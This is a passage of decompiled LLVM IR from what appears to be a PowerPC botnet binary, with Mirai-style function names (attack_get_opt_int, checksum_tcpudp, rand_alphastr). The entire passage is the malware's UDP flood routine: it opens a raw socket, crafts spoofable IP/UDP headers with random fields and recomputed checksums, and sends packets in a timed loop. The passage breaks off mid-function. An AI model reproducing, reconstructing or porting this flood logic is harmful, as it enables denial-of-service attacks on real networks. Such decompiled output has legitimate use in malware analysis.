  store i32 %v0_1000493c, i32* %r3.global-to-local, align 4
  store i32 268454212, i32* @lr, align 4
  %v4_10004940 = inttoptr i32 %v0_1000492c to i32*
  %v5_10004940 = call i32 @attack_get_opt_int(i32 %v0_1000493c, i32* %v4_10004940, i32 7, i32 65535)
  %v0_10004944 = load i32, i32* @r29, align 4
  store i32 %v5_10004940, i32* %r25.global-to-local, align 4
  %v0_10004954 = load i32, i32* @r28, align 4
  store i32 %v0_10004954, i32* %r3.global-to-local, align 4
  store i32 268454236, i32* @lr, align 4
  %v4_10004958 = inttoptr i32 %v0_10004944 to i32*
  %v5_10004958 = call i32 @attack_get_opt_int(i32 %v0_10004954, i32* %v4_10004958, i32 0, i32 512)
  %v0_1000495c = load i32, i32* @r29, align 4
  store i32 %v5_10004958, i32* %r30.global-to-local, align 4
  %v0_1000496c = load i32, i32* @r28, align 4
  store i32 %v0_1000496c, i32* %r3.global-to-local, align 4
  store i32 268454260, i32* @lr, align 4
  %v4_10004970 = inttoptr i32 %v0_1000495c to i32*
  %v5_10004970 = call i32 @attack_get_opt_int(i32 %v0_1000496c, i32* %v4_10004970, i32 1, i32 1)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10004978 = load i32, i32* @global_var_100211e0.76, align 4
  %v0_1000497c = load i32, i32* @r29, align 4
  %v1_10004984 = urem i32 %v5_10004970, 256
  store i32 %v1_10004984, i32* %r14.global-to-local, align 4
  %v0_10004988 = load i32, i32* @r28, align 4
  store i32 %v0_10004988, i32* %r3.global-to-local, align 4
  store i32 268454288, i32* @lr, align 4
  %v4_1000498c = inttoptr i32 %v0_1000497c to i32*
  %v5_1000498c = call i32 @attack_get_opt_int(i32 %v0_10004988, i32* %v4_1000498c, i32 24, i32 %v3_10004978)
  store i32 %v5_1000498c, i32* @r26, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10004998 = call i32 @__GI_time()
  %v1_100049a0 = load i32, i32* @r27, align 4
  %v2_100049a0 = add i32 %v1_100049a0, %v0_10004998
  store i32 %v2_100049a0, i32* %r16.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268454320, i32* @lr, align 4
  %v3_100049ac = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_100049ac, i32* %r3.global-to-local, align 4
  %v1_100049b0 = icmp slt i32 %v3_100049ac, -1
  %v2_100049b0 = icmp sgt i32 %v3_100049ac, -1
  %v3_100049b0 = icmp eq i32 %v3_100049ac, -1
  store i1 %v1_100049b0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100049b0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100049b0, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_100049ac, i32* @r22, align 4
  br i1 %v3_100049b0, label %dec_label_pc_10004bd0, label %dec_label_pc_100049bc

dec_label_pc_100049bc:                            ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_100049c8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-104, align 4
  store i32 268454360, i32* @lr, align 4
  %v5_100049d4 = call i32 @__GI_setsockopt(i32 0, i32 3, i32 %v2_100049c8, i32 4, i32 4)
  store i32 %v5_100049d4, i32* %r3.global-to-local, align 4
  %v1_100049d8 = icmp slt i32 %v5_100049d4, -1
  %v2_100049d8 = icmp sgt i32 %v5_100049d4, -1
  %v3_100049d8 = icmp eq i32 %v5_100049d4, -1
  store i1 %v1_100049d8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100049d8, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100049d8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100049d8, label %dec_label_pc_10004cb0, label %dec_label_pc_100049e0

dec_label_pc_100049e0:                            ; preds = %dec_label_pc_100049bc
  %v0_100049e0 = load i32, i32* %r30.global-to-local, align 4
  %v1_100049e0 = urem i32 %v0_100049e0, 65536
  store i32 %v1_100049e0, i32* @r23, align 4
  %v0_100049e4 = load i32, i32* %r17.global-to-local, align 4
  %v1_100049e4 = urem i32 %v0_100049e4, 65536
  store i32 %v1_100049e4, i32* @r27, align 4
  %v1_100049e8 = icmp ult i32 %v1_100049e0, 1460
  %v2_100049e8 = icmp ugt i32 %v1_100049e0, 1460
  %v3_100049e8 = icmp eq i32 %v1_100049e0, 1460
  store i1 %v1_100049e8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100049e8, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100049e8, i1* %cr7_eq.global-to-local, align 1
  %v0_100049ec = load i32, i32* %r24.global-to-local, align 4
  %v1_100049ec = urem i32 %v0_100049ec, 65536
  store i32 %v1_100049ec, i32* @r28, align 4
  %v0_100049f0 = load i32, i32* %r25.global-to-local, align 4
  %v1_100049f0 = urem i32 %v0_100049f0, 65536
  store i32 %v1_100049f0, i32* @r30, align 4
  br i1 %v2_100049e8, label %dec_label_pc_10004ca8, label %dec_label_pc_100049f8

dec_label_pc_100049f8:                            ; preds = %dec_label_pc_100049e0, %dec_label_pc_10004ca8
  %v0_100049f8 = load i32, i32* %r20.global-to-local, align 4
  %v1_100049f8 = icmp slt i32 %v0_100049f8, 0
  %v2_100049f8 = icmp sgt i32 %v0_100049f8, 0
  %v3_100049f8 = icmp eq i32 %v0_100049f8, 0
  store i1 %v1_100049f8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100049f8, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100049f8, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-104, align 4
  %v0_10004a04 = call i32 @__asm_mfcr()
  store i32 %v0_10004a04, i32* %r3.global-to-local, align 4
  %v1_10004a08 = mul i32 %v0_10004a04, 268435456
  store i32 %v1_10004a08, i32* %r17.global-to-local, align 4
  %v0_10004a0c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004a0c, label %dec_label_pc_10004ab0, label %dec_label_pc_10004a10

dec_label_pc_10004a10:                            ; preds = %dec_label_pc_100049f8
  %v0_10004a10 = load i32, i32* %r15.global-to-local, align 4
  %v1_10004a10 = icmp slt i32 %v0_10004a10, 0
  %v2_10004a10 = icmp sgt i32 %v0_10004a10, 0
  %v3_10004a10 = icmp eq i32 %v0_10004a10, 0
  store i1 %v1_10004a10, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10004a10, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10004a10, i1* %cr7_eq.global-to-local, align 1
  %v0_10004a14 = load i32, i32* @r23, align 4
  %v1_10004a14 = add i32 %v0_10004a14, 28
  store i32 %v1_10004a14, i32* %r0.global-to-local, align 4
  %v1_10004a18 = add i32 %v0_10004a14, 8
  store i32 %v1_10004a18, i32* %r9.global-to-local, align 4
  %v1_10004a1c = urem i32 %v1_10004a14, 65536
  store i32 %v1_10004a1c, i32* @r24, align 4
  %v1_10004a20 = urem i32 %v1_10004a18, 65536
  store i32 %v1_10004a20, i32* @r25, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  br i1 %v3_10004a10, label %dec_label_pc_10004a2c, label %dec_label_pc_10004cc0

dec_label_pc_10004a2c:                            ; preds = %dec_label_pc_10004a10, %dec_label_pc_10004a2c
  store i32 1510, i32* %r3.global-to-local, align 4
  store i32 268454456, i32* @lr, align 4
  %v2_10004a34 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_10004a34, i32* %r3.global-to-local, align 4
  %v3_10004a38 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10004a38, i32* %r10.global-to-local, align 4
  %v0_10004a3c = load i32, i32* @r29, align 4
  %v1_10004a3c = mul i32 %v0_10004a3c, 4
  store i32 %v1_10004a3c, i32* %r0.global-to-local, align 4
  %v1_10004a40 = load i32, i32* @r21, align 4
  %v3_10004a40 = add i32 %v1_10004a40, %v1_10004a3c
  %v4_10004a40 = inttoptr i32 %v3_10004a40 to i32*
  store i32 %v2_10004a34, i32* %v4_10004a40, align 4
  %v0_10004a44 = load i32, i32* %r10.global-to-local, align 4
  %v1_10004a44 = mul i32 %v0_10004a44, 4
  store i32 %v1_10004a44, i32* %r9.global-to-local, align 4
  %v1_10004a48 = add i32 %v0_10004a44, 1
  store i32 %v1_10004a48, i32* %r29.global-to-local, align 4
  %v1_10004a4c = mul i32 %v0_10004a44, 24
  store i32 %v1_10004a4c, i32* %r10.global-to-local, align 4
  %v1_10004a50 = load i32, i32* @r21, align 4
  %v2_10004a50 = add i32 %v1_10004a50, %v1_10004a44
  %v3_10004a50 = inttoptr i32 %v2_10004a50 to i32*
  %v4_10004a50 = load i32, i32* %v3_10004a50, align 4
  store i32 %v4_10004a50, i32* %r11.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v0_10004a58 = load i32, i32* %r20.global-to-local, align 4
  %v2_10004a58 = icmp slt i32 %v0_10004a58, %v1_10004a48
  %v3_10004a58 = icmp sgt i32 %v0_10004a58, %v1_10004a48
  %v4_10004a58 = icmp eq i32 %v0_10004a58, %v1_10004a48
  store i1 %v2_10004a58, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10004a58, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10004a58, i1* %cr7_eq.global-to-local, align 1
  %v1_10004a5c = load i32, i32* @r31, align 4
  %v2_10004a5c = add i32 %v1_10004a5c, %v1_10004a4c
  store i32 %v2_10004a5c, i32* %r10.global-to-local, align 4
  %v1_10004a60 = inttoptr i32 %v4_10004a50 to i32*
  %v2_10004a60 = load i32, i32* %v1_10004a60, align 4
  store i32 %v2_10004a60, i32* %r0.global-to-local, align 4
  %v0_10004a64 = load i32, i32* %r19.global-to-local, align 4
  %v1_10004a64 = trunc i32 %v0_10004a64 to i8
  %v3_10004a64 = add i32 %v4_10004a50, 8
  %v4_10004a64 = inttoptr i32 %v3_10004a64 to i8*
  store i8 %v1_10004a64, i8* %v4_10004a64, align 1
  %v1_10004a68 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10004a68, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_10004a70 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10004a70, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r9.global-to-local, align 4
  %v1_10004a78 = load i32, i32* %r11.global-to-local, align 4
  %v2_10004a78 = inttoptr i32 %v1_10004a78 to i32*
  store i32 %v1_10004a70, i32* %v2_10004a78, align 4
  %v0_10004a7c = load i32, i32* %r9.global-to-local, align 4
  %v1_10004a7c = trunc i32 %v0_10004a7c to i8
  %v2_10004a7c = load i32, i32* %r11.global-to-local, align 4
  %v3_10004a7c = add i32 %v2_10004a7c, 9
  %v4_10004a7c = inttoptr i32 %v3_10004a7c to i8*
  store i8 %v1_10004a7c, i8* %v4_10004a7c, align 1
  %v0_10004a80 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004a80 = add i32 %v0_10004a80, 20
  store i32 %v1_10004a80, i32* %r9.global-to-local, align 4
  %v0_10004a84 = load i32, i32* %r18.global-to-local, align 4
  %v1_10004a84 = trunc i32 %v0_10004a84 to i8
  %v3_10004a84 = add i32 %v0_10004a80, 1
  %v4_10004a84 = inttoptr i32 %v3_10004a84 to i8*
  store i8 %v1_10004a84, i8* %v4_10004a84, align 1
  %v0_10004a88 = load i32, i32* @r26, align 4
  %v1_10004a88 = load i32, i32* %r11.global-to-local, align 4
  %v2_10004a88 = add i32 %v1_10004a88, 12
  %v3_10004a88 = inttoptr i32 %v2_10004a88 to i32*
  store i32 %v0_10004a88, i32* %v3_10004a88, align 4
  %v0_10004a8c = load i32, i32* @r24, align 4
  %v1_10004a8c = trunc i32 %v0_10004a8c to i16
  %v2_10004a8c = load i32, i32* %r11.global-to-local, align 4
  %v3_10004a8c = add i32 %v2_10004a8c, 2
  %v4_10004a8c = inttoptr i32 %v3_10004a8c to i16*
  store i16 %v1_10004a8c, i16* %v4_10004a8c, align 2
  %v0_10004a90 = load i32, i32* %r10.global-to-local, align 4
  %v1_10004a90 = add i32 %v0_10004a90, 16
  %v2_10004a90 = inttoptr i32 %v1_10004a90 to i32*
  %v3_10004a90 = load i32, i32* %v2_10004a90, align 4
  store i32 %v3_10004a90, i32* %r0.global-to-local, align 4
  %v0_10004a94 = load i32, i32* @r27, align 4
  %v1_10004a94 = trunc i32 %v0_10004a94 to i16
  %v2_10004a94 = load i32, i32* %r11.global-to-local, align 4
  %v3_10004a94 = add i32 %v2_10004a94, 4
  %v4_10004a94 = inttoptr i32 %v3_10004a94 to i16*
  store i16 %v1_10004a94, i16* %v4_10004a94, align 2
  %v0_10004a98 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004a98 = load i32, i32* %r11.global-to-local, align 4
  %v2_10004a98 = add i32 %v1_10004a98, 16
  %v3_10004a98 = inttoptr i32 %v2_10004a98 to i32*
  store i32 %v0_10004a98, i32* %v3_10004a98, align 4
  %v0_10004a9c = load i32, i32* @r28, align 4
  %v1_10004a9c = trunc i32 %v0_10004a9c to i16
  %v2_10004a9c = load i32, i32* %r11.global-to-local, align 4
  %v3_10004a9c = add i32 %v2_10004a9c, 20
  %v4_10004a9c = inttoptr i32 %v3_10004a9c to i16*
  store i16 %v1_10004a9c, i16* %v4_10004a9c, align 2
  %v0_10004aa0 = load i32, i32* @r25, align 4
  %v1_10004aa0 = trunc i32 %v0_10004aa0 to i16
  %v2_10004aa0 = load i32, i32* %r9.global-to-local, align 4
  %v3_10004aa0 = add i32 %v2_10004aa0, 4
  %v4_10004aa0 = inttoptr i32 %v3_10004aa0 to i16*
  store i16 %v1_10004aa0, i16* %v4_10004aa0, align 2
  %v0_10004aa4 = load i32, i32* @r30, align 4
  %v1_10004aa4 = trunc i32 %v0_10004aa4 to i16
  %v2_10004aa4 = load i32, i32* %r9.global-to-local, align 4
  %v3_10004aa4 = add i32 %v2_10004aa4, 2
  %v4_10004aa4 = inttoptr i32 %v3_10004aa4 to i16*
  store i16 %v1_10004aa4, i16* %v4_10004aa4, align 2
  %v0_10004aa8 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10004aa8, i32* %stack_var_-104, align 4
  %v0_10004aac = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_10004aac, label %dec_label_pc_10004a2c, label %dec_label_pc_10004ab0

dec_label_pc_10004ab0:                            ; preds = %dec_label_pc_10004cc0, %dec_label_pc_10004a2c, %dec_label_pc_100049f8
  %v0_10004ab4 = load i32, i32* %r14.global-to-local, align 4
  %v3_10004ab4 = icmp eq i32 %v0_10004ab4, 0
  store i1 %v3_10004ab4, i1* %cr2_eq.global-to-local, align 1
  store i32 65535, i32* %r0.global-to-local, align 4
  %v0_10004abc = load i32, i32* @r30, align 4
  %v2_10004abc = icmp slt i32 %v0_10004abc, 65535
  %v3_10004abc = icmp sgt i32 %v0_10004abc, 65535
  %v4_10004abc = icmp eq i32 %v0_10004abc, 65535
  store i1 %v2_10004abc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10004abc, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10004abc, i1* %cr7_eq.global-to-local, align 1
  %v0_10004ac0 = load i32, i32* @r27, align 4
  %v4_10004ac0 = icmp eq i32 %v0_10004ac0, 65535
  store i1 %v4_10004ac0, i1* %cr3_eq.global-to-local, align 1
  %v0_10004ac4 = load i32, i32* @r28, align 4
  %v4_10004ac4 = icmp eq i32 %v0_10004ac4, 65535
  store i1 %v4_10004ac4, i1* %cr4_eq.global-to-local, align 1
  %v0_10004ac8 = load i32, i32* @r23, align 4
  %v1_10004ac8 = add i32 %v0_10004ac8, 28
  store i32 %v1_10004ac8, i32* @r30, align 4
  %v0_10004acc = call i32 @__asm_mfcr()
  store i32 %v0_10004acc, i32* %r3.global-to-local, align 4
  %v1_10004ad0 = mul i32 %v0_10004acc, 268435456
  store i32 %v1_10004ad0, i32* @r24, align 4
  %v0_10004ad4 = load i32, i32* @r26, align 4
  %v1_10004ad4 = icmp slt i32 %v0_10004ad4, -1
  %v2_10004ad4 = icmp sgt i32 %v0_10004ad4, -1
  %v3_10004ad4 = icmp eq i32 %v0_10004ad4, -1
  store i1 %v1_10004ad4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10004ad4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10004ad4, i1* %cr7_eq.global-to-local, align 1
  %v0_10004ad8 = load i32, i32* @r23, align 4
  %v1_10004ad8 = add i32 %v0_10004ad8, 8
  store i32 %v1_10004ad8, i32* @r26, align 4
  %v0_10004adc = call i32 @__asm_mfcr()
  store i32 %v0_10004adc, i32* %r3.global-to-local, align 4
  %v1_10004ae0 = mul i32 %v0_10004adc, 268435456
  store i32 %v1_10004ae0, i32* @r25, align 4
  br label %dec_label_pc_10004ae4

dec_label_pc_10004ae4:                            ; preds = %dec_label_pc_10004bc0, %dec_label_pc_10004ab0
  %v0_10004ae4 = load i32, i32* %r17.global-to-local, align 4
  %v1_10004ae4 = mul i32 %v0_10004ae4, 16
  %v2_10004ae4 = udiv i32 %v0_10004ae4, 268435456
  %v3_10004ae4 = or i32 %v2_10004ae4, %v1_10004ae4
  store i32 %v3_10004ae4, i32* %r17.global-to-local, align 4
  %v1_10004ae8 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10004ae4)
  %v1_10004aec = mul nuw i32 %v2_10004ae4, 268435456
  %v2_10004aec = urem i32 %v0_10004ae4, 268435456
  %v3_10004aec = or i32 %v1_10004aec, %v2_10004aec
  store i32 %v3_10004aec, i32* %r17.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-104, align 4
  %v0_10004af8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004af8, label %dec_label_pc_10004bc0, label %dec_label_pc_10004afc

dec_label_pc_10004afc:                            ; preds = %dec_label_pc_10004ae4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10004b00

dec_label_pc_10004b00:                            ; preds = %dec_label_pc_10004b4c, %dec_label_pc_10004afc
  %v0_10004b00 = phi i32 [ %v1_10004bb0, %dec_label_pc_10004b4c ], [ 0, %dec_label_pc_10004afc ]
  %v1_10004b00 = mul i32 %v0_10004b00, 24
  store i32 %v1_10004b00, i32* %r0.global-to-local, align 4
  %v1_10004b04 = mul i32 %v0_10004b00, 4
  store i32 %v1_10004b04, i32* %r11.global-to-local, align 4
  %v1_10004b08 = load i32, i32* @r21, align 4
  %v2_10004b08 = add i32 %v1_10004b08, %v1_10004b04
  %v3_10004b08 = inttoptr i32 %v2_10004b08 to i32*
  %v4_10004b08 = load i32, i32* %v3_10004b08, align 4
  store i32 %v4_10004b08, i32* @r28, align 4
  %v1_10004b0c = load i32, i32* @r31, align 4
  %v2_10004b0c = add i32 %v1_10004b0c, %v1_10004b00
  store i32 %v2_10004b0c, i32* %r10.global-to-local, align 4
  %v1_10004b10 = add i32 %v2_10004b0c, 20
  %v2_10004b10 = inttoptr i32 %v1_10004b10 to i8*
  %v3_10004b10 = load i8, i8* %v2_10004b10, align 1
  %v4_10004b10 = zext i8 %v3_10004b10 to i32
  store i32 %v4_10004b10, i32* %r9.global-to-local, align 4
  %v1_10004b14 = add i32 %v4_10004b08, 20
  store i32 %v1_10004b14, i32* @r27, align 4
  %v1_10004b18 = icmp ult i8 %v3_10004b10, 31
  %v2_10004b18 = icmp ugt i8 %v3_10004b10, 31
  %v3_10004b18 = icmp eq i8 %v3_10004b10, 31
  store i1 %v1_10004b18, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10004b18, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10004b18, i1* %cr7_eq.global-to-local, align 1
  %tmp25 = icmp ult i8 %v3_10004b10, 32
  br i1 %tmp25, label %dec_label_pc_10004c80, label %dec_label_pc_10004b20

dec_label_pc_10004b20:                            ; preds = %dec_label_pc_10004b00, %dec_label_pc_10004c80
  %v0_10004b20 = load i32, i32* @r25, align 4
  %v1_10004b20 = mul i32 %v0_10004b20, 16
  %v2_10004b20 = udiv i32 %v0_10004b20, 268435456
  %v3_10004b20 = or i32 %v2_10004b20, %v1_10004b20
  store i32 %v3_10004b20, i32* %r25.global-to-local, align 4
  %v1_10004b24 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10004b20)
  %v0_10004b2c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004b2c, label %dec_label_pc_10004c70, label %dec_label_pc_10004b30

dec_label_pc_10004b30:                            ; preds = %dec_label_pc_10004b20
  %v0_10004b30 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10004b30, label %dec_label_pc_10004c58, label %dec_label_pc_10004b34

dec_label_pc_10004b34:                            ; preds = %dec_label_pc_10004c70, %dec_label_pc_10004b30
  %v0_10004b34 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10004b34, label %dec_label_pc_10004c64, label %dec_label_pc_10004b38

dec_label_pc_10004b38:                            ; preds = %dec_label_pc_10004c58, %dec_label_pc_10004b34, %dec_label_pc_10004c64
  %v0_10004b38 = load i32, i32* @r24, align 4
  %v1_10004b38 = mul i32 %v0_10004b38, 16
  %v2_10004b38 = udiv i32 %v0_10004b38, 268435456
  %v3_10004b38 = or i32 %v2_10004b38, %v1_10004b38
  store i32 %v3_10004b38, i32* %r24.global-to-local, align 4
  %v1_10004b3c = call %0 @__asm_mtcrf(i32 1, i32 %v3_10004b38)
  %v1_10004b40 = mul nuw i32 %v2_10004b38, 268435456
  %v2_10004b40 = urem i32 %v0_10004b38, 268435456
  %v3_10004b40 = or i32 %v1_10004b40, %v2_10004b40
  store i32 %v3_10004b40, i32* @r24, align 4
  %v0_10004b44 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004b44, label %dec_label_pc_10004c30, label %dec_label_pc_10004b48

dec_label_pc_10004b48:                            ; preds = %dec_label_pc_10004b38
  %v0_10004b48 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10004b48, label %dec_label_pc_10004b4c, label %dec_label_pc_10004c3c

dec_label_pc_10004b4c:                            ; preds = %dec_label_pc_10004b48, %dec_label_pc_10004c30, %dec_label_pc_10004c3c
  store i32 0, i32* %r29.global-to-local, align 4
  %v2_10004b54 = load i32, i32* @r28, align 4
  %v3_10004b54 = add i32 %v2_10004b54, 10
  %v4_10004b54 = inttoptr i32 %v3_10004b54 to i16*
  store i16 0, i16* %v4_10004b54, align 2
  %v0_10004b58 = load i32, i32* @r28, align 4
  store i32 %v0_10004b58, i32* @r3, align 4
  %v2_10004b5c = call i32 @checksum_generic(i32 %v0_10004b58, i32 20)
  %v3_10004b5c = trunc i32 %v2_10004b5c to i16
  %v0_10004b60 = load i32, i32* @r27, align 4
  store i32 %v0_10004b60, i32* @r4, align 4
  %v3_10004b64 = load i32, i32* @r28, align 4
  %v4_10004b64 = add i32 %v3_10004b64, 10
  %v5_10004b64 = inttoptr i32 %v4_10004b64 to i16*
  store i16 %v3_10004b5c, i16* %v5_10004b64, align 2
  %v0_10004b68 = load i32, i32* @r26, align 4
  %v0_10004b6c = load i32, i32* %r29.global-to-local, align 4
  %v1_10004b6c = trunc i32 %v0_10004b6c to i16
  %v2_10004b6c = load i32, i32* @r27, align 4
  %v3_10004b6c = add i32 %v2_10004b6c, 6
  %v4_10004b6c = inttoptr i32 %v3_10004b6c to i16*
  store i16 %v1_10004b6c, i16* %v4_10004b6c, align 2
  %v0_10004b70 = load i32, i32* @r28, align 4
  store i32 %v0_10004b70, i32* %r3.global-to-local, align 4
  %v0_10004b74 = load i32, i32* @r27, align 4
  %v1_10004b74 = add i32 %v0_10004b74, 4
  %v2_10004b74 = inttoptr i32 %v1_10004b74 to i16*
  %v3_10004b74 = load i16, i16* %v2_10004b74, align 2
  %v4_10004b74 = zext i16 %v3_10004b74 to i32
  %v4_10004b78 = call i32 @checksum_tcpudp(i32 %v0_10004b70, i32 %v0_10004b60, i32 %v4_10004b74, i32 %v0_10004b68)
  %v5_10004b78 = trunc i32 %v4_10004b78 to i16
  store i32 %v4_10004b78, i32* %r3.global-to-local, align 4
  %v3_10004b7c = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10004b7c, i32* %r7.global-to-local, align 4
  %v0_10004b80 = load i32, i32* @r27, align 4
  %v1_10004b80 = add i32 %v0_10004b80, 2
  %v2_10004b80 = inttoptr i32 %v1_10004b80 to i16*
  %v3_10004b80 = load i16, i16* %v2_10004b80, align 2
  %v4_10004b80 = zext i16 %v3_10004b80 to i32
  store i32 %v4_10004b80, i32* %r0.global-to-local, align 4
  %v0_10004b84 = load i32, i32* @r28, align 4
  %v1_10004b88 = mul i32 %v3_10004b7c, 24
  store i32 %v1_10004b88, i32* %r7.global-to-local, align 4
  %v4_10004b8c = add i32 %v0_10004b80, 6
  %v5_10004b8c = inttoptr i32 %v4_10004b8c to i16*
  store i16 %v5_10004b78, i16* %v5_10004b8c, align 2
  %v0_10004b90 = load i32, i32* @r30, align 4
  %v0_10004b94 = load i32, i32* @r22, align 4
  store i32 %v0_10004b94, i32* %r3.global-to-local, align 4
  %v0_10004b98 = load i32, i32* %r7.global-to-local, align 4
  %v1_10004b98 = load i32, i32* @r31, align 4
  %v2_10004b98 = add i32 %v1_10004b98, %v0_10004b98
  store i32 %v2_10004b98, i32* %r7.global-to-local, align 4
  %v0_10004ba0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004ba0 = trunc i32 %v0_10004ba0 to i16
  %v3_10004ba0 = add i32 %v2_10004b98, 2
  %v4_10004ba0 = inttoptr i32 %v3_10004ba0 to i16*
  store i16 %v1_10004ba0, i16* %v4_10004ba0, align 2
  store i32 16, i32* %r8.global-to-local, align 4
  store i32 268454828, i32* @lr, align 4
  %v6_10004ba8 = call i32 @__libc_sendto(i32 %v0_10004b94, i32 %v0_10004b84, i32 %v0_10004b90, i32 16384, i32 %v2_10004b98, i32 16)
  store i32 %v6_10004ba8, i32* %r3.global-to-local, align 4
  %v3_10004bac = load i32, i32* %stack_var_-104, align 4
  %v1_10004bb0 = add i32 %v3_10004bac, 1
  store i32 %v1_10004bb0, i32* %r9.global-to-local, align 4
  %v1_10004bb4 = load i32, i32* %r20.global-to-local, align 4
  %v2_10004bb4 = icmp slt i32 %v1_10004bb0, %v1_10004bb4
  %v3_10004bb4 = icmp sgt i32 %v1_10004bb0, %v1_10004bb4
  %v4_10004bb4 = icmp eq i32 %v1_10004bb0, %v1_10004bb4
  store i1 %v2_10004bb4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10004bb4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10004bb4, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10004bb0, i32* %stack_var_-104, align 4
  br i1 %v2_10004bb4, label %dec_label_pc_10004b00, label %dec_label_pc_10004bc0

dec_label_pc_10004bc0:                            ; preds = %dec_label_pc_10004b4c, %dec_label_pc_10004ae4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10004bc4 = call i32 @__GI_time()
  store i32 %v0_10004bc4, i32* %r3.global-to-local, align 4
  %v0_10004bc8 = load i32, i32* %r16.global-to-local, align 4
  %v2_10004bc8 = icmp slt i32 %v0_10004bc8, %v0_10004bc4
  %v3_10004bc8 = icmp sgt i32 %v0_10004bc8, %v0_10004bc4
  %v4_10004bc8 = icmp eq i32 %v0_10004bc8, %v0_10004bc4
  store i1 %v2_10004bc8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10004bc8, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10004bc8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10004bc8, label %dec_label_pc_10004bd0, label %dec_label_pc_10004ae4

dec_label_pc_10004bd0:                            ; preds = %dec_label_pc_10004bc0, %entry, %dec_label_pc_10004cb0
  store i32 %v0_10004840, i32* %r0.global-to-local, align 4
  %v1_10004be4 = call %0 @__asm_mtcrf(i32 56, i32 %v0_1000482c)
  store i32 %v0_10004878, i32* %r24.global-to-local, align 4
  store i32 %v0_1000487c, i32* %r25.global-to-local, align 4
  store i32 %v0_1000488c, i32* %r29.global-to-local, align 4
  store i32 %v0_10004894, i32* %r30.global-to-local, align 4
  %v0_10004c2c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10004c2c

dec_label_pc_10004c30:                            ; preds = %dec_label_pc_10004b38
  %v0_10004c30 = call i32 @rand_next()
  %v1_10004c30 = trunc i32 %v0_10004c30 to i16
  store i32 %v0_10004c30, i32* %r3.global-to-local, align 4
  %v3_10004c34 = load i32, i32* @r27, align 4
  %v4_10004c34 = add i32 %v3_10004c34, 2
  %v5_10004c34 = inttoptr i32 %v4_10004c34 to i16*
  store i16 %v1_10004c30, i16* %v5_10004c34, align 2
  %v0_10004c38 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10004c38, label %dec_label_pc_10004b4c, label %dec_label_pc_10004c3c

dec_label_pc_10004c3c:                            ; preds = %dec_label_pc_10004b48, %dec_label_pc_10004c30
  %v0_10004c3c = load i32, i32* @r28, align 4
  %v1_10004c3c = add i32 %v0_10004c3c, 28
  store i32 %v1_10004c3c, i32* @r29, align 4
  %v0_10004c40 = load i32, i32* @r23, align 4
  store i32 %v0_10004c40, i32* @r4, align 4
  store i32 %v1_10004c3c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10004c4c.89 to i32), i32* @lr, align 4
  %v0_10004c48 = call i32 @rand_alphastr()
  store i32 %v0_10004c48, i32* %r3.global-to-local, align 4
